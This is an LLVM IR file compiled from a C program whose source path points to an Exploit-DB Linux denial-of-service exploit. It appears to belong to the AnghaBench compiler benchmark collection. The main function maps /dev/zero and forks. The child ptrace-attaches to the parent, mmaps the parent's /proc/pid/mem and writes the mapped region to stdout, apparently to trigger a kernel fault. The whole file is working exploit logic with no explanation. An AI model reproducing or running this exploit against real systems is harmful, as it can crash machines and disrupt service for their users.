; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_22105.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_22105.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"/dev/zero\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@PAGES = common dso_local global i32 0, align 4
@PAGE_SIZE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@PTRACE_ATTACH = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [13 x i8] c"/proc/%d/mem\00", align 1
@PROT_READ = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [64 x i8], align 16
  store i32 0, i32* %1, align 4
  %9 = load i32, i32* @O_RDONLY, align 4
  %10 = call i32 @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i32 %9)
  store i32 %10, i32* %4, align 4
  %11 = load i32, i32* @PAGES, align 4
  %12 = load i32, i32* @PAGE_SIZE, align 4
  %13 = mul nsw i32 %11, %12
  %14 = load i32, i32* @MAP_PRIVATE, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i64 @mmap(i32 0, i32 %13, i32 0, i32 %14, i32 %15, i32 0)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %2, align 4
  %18 = call i32 (...) @getpid()
  store i32 %18, i32* %6, align 4
  %19 = call i32 (...) @fork()
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %48, label %21

21:                                               ; preds = %0
  %22 = load i32, i32* @PTRACE_ATTACH, align 4
  %23 = load i32, i32* %6, align 4
  %24 = call i32 @ptrace(i32 %22, i32 %23, i32 0, i32 0)
  %25 = call i32 @sleep(i32 1)
  %26 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %27 = load i32, i32* %6, align 4
  %28 = call i32 @sprintf(i8* %26, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i32 %27)
  %29 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %30 = load i32, i32* @O_RDONLY, align 4
  %31 = call i32 @open(i8* %29, i32 %30)
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* @PAGES, align 4
  %33 = load i32, i32* @PAGE_SIZE, align 4
  %34 = mul nsw i32 %32, %33
  %35 = load i32, i32* @PROT_READ, align 4
  %36 = load i32, i32* @MAP_PRIVATE, align 4
  %37 = load i32, i32* %5, align 4
  %38 = load i32, i32* %2, align 4
  %39 = call i64 @mmap(i32 0, i32 %34, i32 %35, i32 %36, i32 %37, i32 %38)
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %3, align 4
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = inttoptr i64 %42 to i8*
  %44 = load i32, i32* @PAGES, align 4
  %45 = load i32, i32* @PAGE_SIZE, align 4
  %46 = mul nsw i32 %44, %45
  %47 = call i32 @write(i32 1, i8* %43, i32 %46)
  br label %48

48:                                               ; preds = %21, %0
  %49 = call i32 @sleep(i32 100)
  ret i32 0
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i64 @mmap(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @ptrace(i32, i32, i32, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
